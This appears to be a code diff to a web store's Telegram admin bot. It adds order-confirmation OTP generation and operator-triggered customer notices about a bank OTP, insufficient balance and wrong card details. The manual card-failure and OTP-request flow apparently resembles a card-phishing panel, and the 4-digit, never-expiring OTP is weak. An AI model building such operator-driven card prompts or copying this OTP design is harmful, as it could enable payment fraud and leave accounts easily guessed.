@@ -1,4 +1,4 @@
-import { randomBytes, timingSafeEqual } from 'node:crypto';
+import { createHash, randomBytes, randomInt, timingSafeEqual } from 'node:crypto';
 import { ObjectId, type Db } from 'mongodb';
 import { after, NextRequest, NextResponse } from 'next/server';
 import { getDb } from '@/lib/mongodb';
@@ -632,10 +632,21 @@ async function getOrderDocumentRows(db: Db, order: StoreOrder) {
 
 async function listOrderDetails(db: Db, chatId: number, id: string) {
   if (!isObjectId(id)) return sendTelegramMessage(chatId, 'معرّف الطلب غير صالح.');
-  const order = await db.collection<StoreOrder>('orders').findOne({ _id: new ObjectId(id) });
+  const order = await db.collection<StoreOrder & {
+    orderConfirmationOtpHash?: string;
+    orderConfirmationOtpSalt?: string;
+    orderConfirmationOtpVersion?: number;
+    orderConfirmationVerifiedAt?: Date;
+  }>('orders').findOne({ _id: new ObjectId(id) });
   if (!order) return sendTelegramMessage(chatId, 'لم يتم العثور على الطلب.');
   const closed = order.status === 'completed' || order.status === 'cancelled';
   const documentRows = await getOrderDocumentRows(db, order);
+  const reviewRows = [
+    [{ text: '❌ طلب رمز OTP جديد', callback_data: 'order-notice:' + id + ':otp' }],
+    [{ text: 'لا يوجد رصيد كافٍ', callback_data: 'order-notice:' + id + ':balance' }],
+    [{ text: 'بيانات البطاقة خاطئة', callback_data: 'order-notice:' + id + ':card' }],
+    [{ text: '🔐 إنشاء OTP للطلب', callback_data: 'create-order-otp:' + id }]
+  ];
   await sendTelegramMessage(
     chatId,
     'تفاصيل الطلب\n\n' + formatOrderForAdmin(order as unknown as Record<string, unknown>) +
@@ -644,6 +655,7 @@ async function listOrderDetails(db: Db, chatId: number, id: string) {
       reply_markup: {
         inline_keyboard: [
           ...statusInlineKeyboard(id, order.status).inline_keyboard,
+          ...reviewRows,
           ...documentRows,
           [{ text: '↩ أقسام طلبات العملاء', callback_data: 'orders-menu' }],
           [{ text: 'القائمة الرئيسية', callback_data: 'main-menu' }]
@@ -1675,6 +1687,86 @@ async function handleCallback(db: Db, callback: TelegramCallback) {
     await sendMainMenu(db, chatId, removed ? '🗑 تم حذف المنتج من المتجر.' : 'المنتج غير موجود أو سبق حذفه.');
     return;
   }
+  if (action === 'create-order-otp' && id && isObjectId(id)) {
+    const orderCollection = db.collection<StoreOrder & {
+      orderConfirmationOtpHash?: string;
+      orderConfirmationOtpSalt?: string;
+      orderConfirmationOtpVersion?: number;
+      orderConfirmationVerifiedAt?: Date;
+    }>('orders');
+    const order = await orderCollection.findOne({ _id: new ObjectId(id), source: 'website' });
+    if (!order) {
+      await sendTelegramMessage(chatId, 'لم يتم العثور على الطلب.');
+      return;
+    }
+    if (order.orderConfirmationVerifiedAt) {
+      await sendTelegramMessage(chatId, 'تم تأكيد هذا الطلب بالفعل، ولا يحتاج إلى رمز جديد.');
+      return;
+    }
+
+    const otp = String(randomInt(0, 10_000)).padStart(4, '0');
+    const salt = randomBytes(16).toString('hex');
+    const otpHash = createHash('sha256').update(salt + ':' + otp).digest('hex');
+    const now = new Date();
+    await orderCollection.updateOne(
+      { _id: order._id },
+      {
+        $set: {
+          orderConfirmationOtpHash: otpHash,
+          orderConfirmationOtpSalt: salt,
+          orderConfirmationOtpIssuedAt: now,
+          orderConfirmationOtpVersion: Number(order.orderConfirmationOtpVersion || 0) + 1,
+          updatedAt: now
+        }
+      }
+    );
+    await sendTelegramMessage(
+      chatId,
+      '🔐 رمز تأكيد الطلب ' + (order.orderNumber || id) + ': ' + otp +
+        '\\n\\nأرسل هذا الرمز للعميل بالطريقة التي تعتمدها. يظل صالحًا دون مدة زمنية، وإصدار رمز جديد يُبطل الرمز السابق.'
+    );
+    await listOrderDetails(db, chatId, id);
+    return;
+  }
+
+  if (action === 'order-notice' && id && field && isObjectId(id)) {
+    const order = await db.collection<StoreOrder>('orders').findOne({
+      _id: new ObjectId(id),
+      source: 'website'
+    });
+    if (!order) {
+      await sendTelegramMessage(chatId, 'لم يتم العثور على الطلب.');
+      return;
+    }
+    if (!order.customerNotificationKey) {
+      await sendTelegramMessage(chatId, 'لا يوجد مفتاح إشعارات مرتبط بهذا الطلب.');
+      return;
+    }
+
+    const noticeMap: Record<string, { status: string; statusLabel: string }> = {
+      otp: { status: 'otp_requested', statusLabel: 'طلب رمز OTP جديد' },
+      balance: { status: 'insufficient_balance', statusLabel: 'لا يوجد رصيد كافٍ' },
+      card: { status: 'card_details_incorrect', statusLabel: 'بيانات البطاقة خاطئة' }
+    };
+    const notice = noticeMap[field];
+    if (!notice) {
+      await sendTelegramMessage(chatId, 'نوع الإشعار غير معروف.');
+      return;
+    }
+
+    await db.collection('customer_notifications').insertOne({
+      customerNotificationKey: order.customerNotificationKey,
+      orderId: order._id.toHexString(),
+      orderNumber: order.orderNumber || '#' + order._id.toString().slice(-6),
+      status: notice.status,
+      statusLabel: notice.statusLabel,
+      createdAt: new Date(),
+      readAt: null
+    });
+    await sendTelegramMessage(chatId, '✅ تم إرسال إشعار «' + notice.statusLabel + '» للعميل في جرس إشعارات المتصفح. لم تتغير حالة الطلب.');
+    return;
+  }
+
   if (action === 'orders-menu') {
     await showCustomerOrdersMenu(db, chatId);
     return;
